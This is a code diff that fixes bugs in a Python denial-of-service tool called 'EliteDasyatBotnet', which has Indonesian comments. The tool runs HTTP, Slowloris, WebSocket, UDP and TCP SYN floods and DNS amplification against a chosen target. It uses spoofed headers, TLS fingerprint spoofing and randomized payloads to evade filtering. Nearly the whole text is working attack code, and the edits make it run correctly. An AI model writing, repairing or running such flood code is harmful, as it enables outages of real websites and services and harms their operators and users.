@@ -12,18 +12,18 @@ import dns.resolver
 import ssl
 import websocket
 from fake_useragent import UserAgent
-from typing
+from typing import Dict, List
 import argparse
 
 # Logging Setup
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[logging.StreamHandler("elite_dasyat_botnet.log"), logging.StreamHandler()]
+    handlers=[logging.FileHandler("elite_dasyat_botnet.log"), logging.StreamHandler()]
 )
 
 class EliteDasyatBotnet:
-    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, max_connections: int = 1000, methods: typing.List[str] = None):
+    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, max_connections: int = 1000, methods: List[str] = None):
         self.target_l7 = target_l7.rstrip('/') if target_l7 else None
         self.target_l4 = target_l4 if target_l4 else None
         self.duration = duration
@@ -50,13 +50,13 @@ class EliteDasyatBotnet:
         self.active_connections = 0
 
     def _random_ip(self) -> str:
-        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}}"
-    
+        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+
     def _generate_polymorphic_payload(self, size: int = 128) -> bytes:
         """Polymorphic payload ringan pake hash dan UUID."""
         base = str(uuid.uuid4()).encode() + str(time.time()).encode()
         return base64.b64encode(hashlib.sha256(base + os.urandom(8)).digest())[:size]
-    
+
     def _generate_proof(self, data: bytes) -> str:
         """Simple hash-based proof."""
         return hashlib.sha256(data + str(time.time()).encode()).hexdigest()[:16]
@@ -78,7 +78,7 @@ class EliteDasyatBotnet:
         return headers
 
     def _spoof_tls_fingerprint(self) -> ssl.SSLContext:
-        """TLS fingerprint spoofing untuk JA4 obfuscation."""
+        """TLS fingerprint spoofing untuk JA4."""
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
@@ -86,19 +86,19 @@ class EliteDasyatBotnet:
             "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
             "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
             "TLS_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
-        ], k=random.randint(3, 6))
+        ], k=5)
         context.set_ciphers(":".join(ciphers))
         return context
 
     async def http_flood(self):
-        """L7: HTTP flood canggih dengan polymorphic payload dan WAF bypass."""
+        """L7: HTTP flood dengan polymorphic payload."""
         if not self.target_l7:
             logging.error("L7 HTTP flood requires target_l7")
             return
         async with aiohttp.ClientSession() as session:
-            end_time = asyncio.get_event_loop().time() + self.duration
-            while asyncio.get_event_loop().time() < end_time:
-                start_time = asyncio.get_event_loop().time()
+            end_time = time.time() + self.duration
+            while time.time() < end_time:
+                start_time = time.time()
                 try:
                     headers = self._obfuscate_headers()
                     path = random.choice(self.paths).format(random.randint(1, 5), random.randint(1, 10000))
@@ -112,21 +112,21 @@ class EliteDasyatBotnet:
                         timeout=0.15
                     ) as resp:
                         self.success_count["http"] += 1 if resp.status < 400 else 0
-                        self.response_times["http"].append((asyncio.get_event_loop().time() - start_time) * 1000)
+                        self.response_times["http"].append((time.time() - start_time) * 1000)
                         logging.info(f"L7 HTTP flood to {self.target_l7}{path}, status={resp.status}, proof={proof}")
                 except Exception as e:
                     logging.error(f"L7 HTTP flood failed: {str(e)}")
-                await asyncio.sleep(random.uniform(0.002, 0.01))  # Timing jitter
+                await asyncio.sleep(random.uniform(0.002, 0.01))
 
     async def slowloris(self):
-        """L7: Slowloris untuk exhaust resource server."""
+        """L7: Slowloris untuk exhaust resource."""
         if not self.target_l7:
             logging.error("L7 Slowloris requires target_l7")
             return
         async with aiohttp.ClientSession() as session:
-            end_time = asyncio.get_event_loop().time() + self.duration
-            while asyncio.get_event_loop().time() < end_time:
-                start_time = asyncio.get_event_loop().time()
+            end_time = time.time() + self.duration
+            while time.time() < end_time:
+                start_time = time.time()
                 try:
                     headers = self._obfuscate_headers()
                     headers["Connection"] = "keep-alive"
@@ -137,9 +137,9 @@ class EliteDasyatBotnet:
                         timeout=5
                     ) as resp:
                         self.success_count["slowloris"] += 1 if resp.status < 400 else 0
-                        self.response_times["slowloris"].append((asyncio.get_event_loop().time() - start_time) * 1000)
+                        self.response_times["slowloris"].append((time.time() - start_time) * 1000)
                         logging.info(f"L7 Slowloris to {self.target_l7}, status={resp.status}")
-                        await asyncio.sleep(random.uniform(1, 3))  # Keep connection open
+                        await asyncio.sleep(random.uniform(1, 3))
                 except Exception as e:
                     logging.error(f"L7 Slowloris failed: {str(e)}")
                 await asyncio.sleep(random.uniform(0.01, 0.05))
@@ -149,8 +149,8 @@ class EliteDasyatBotnet:
         if not self.target_l7:
             logging.error("L7 WebSocket flood requires target_l7")
             return
-        end_time = asyncio.get_event_loop().time() + self.duration
-        while asyncio.get_event_loop().time() < end_time:
+        end_time = time.time() + self.duration
+        while time.time() < end_time:
             try:
                 headers = self._obfuscate_headers()
                 ws_url = self.target_l7.replace("http", "ws") + random.choice(self.paths).format(random.randint(1, 5), random.randint(1, 10000))
@@ -161,7 +161,7 @@ class EliteDasyatBotnet:
                 ws.send(payload)
                 self.success_count["websocket"] += 1
                 logging.info(f"L7 WebSocket flood to {ws_url}, proof={proof}")
-                await asyncio.sleep(random.uniform(0.5, 2))  # Keep WebSocket open
+                await asyncio.sleep(random.uniform(0.5, 2))
                 ws.close()
             except Exception as e:
                 logging.error(f"L7 WebSocket flood failed: {str(e)}")
@@ -171,8 +171,8 @@ class EliteDasyatBotnet:
         """L3/L4: DNS amplification ringan."""
         resolver = dns.resolver.Resolver()
         resolver.nameservers = self.dns_servers
-        end_time = asyncio.get_event_loop().time() + self.duration
-        while asyncio.get_event_loop().time() < end_time:
+        end_time = time.time() + self.duration
+        while time.time() < end_time:
             try:
                 domain = f"{uuid.uuid4().hex}.example.com"
                 answer = await asyncio.get_event_loop().run_in_executor(
@@ -190,8 +190,8 @@ class EliteDasyatBotnet:
             logging.error("L4 UDP flood requires target_l4")
             return
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        end_time = asyncio.get_event_loop().time() + self.duration
-        while asyncio.get_event_loop().time() < end_time:
+        end_time = time.time() + self.duration
+        while time.time() < end_time:
             try:
                 payload = self._generate_polymorphic_payload(64)
                 proof = self._generate_proof(payload)
@@ -210,8 +210,8 @@ class EliteDasyatBotnet:
             return
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setblocking(False)
-        end_time = asyncio.get_event_loop().time() + self.duration
-        while asyncio.get_event_loop().time() < end_time:
+        end_time = time.time() + self.duration
+        while time.time() < end_time:
             try:
                 await asyncio.get_event_loop().sock_connect(sock, (self.target_l4, port))
                 self.success_count["tcp_syn"] += 1
@@ -247,7 +247,7 @@ class EliteDasyatBotnet:
         avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
         logging.info(f"Attack completed. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
 
-async def main(target_l7: str, target_l4: str, duration: int, methods: typing.List[str]):
+async def main(target_l7: str, target_l4: str, duration: int, methods: List[str]):
     botnet = EliteDasyatBotnet(target_l7, target_l4, duration, methods=methods)
     await botnet.run()
 
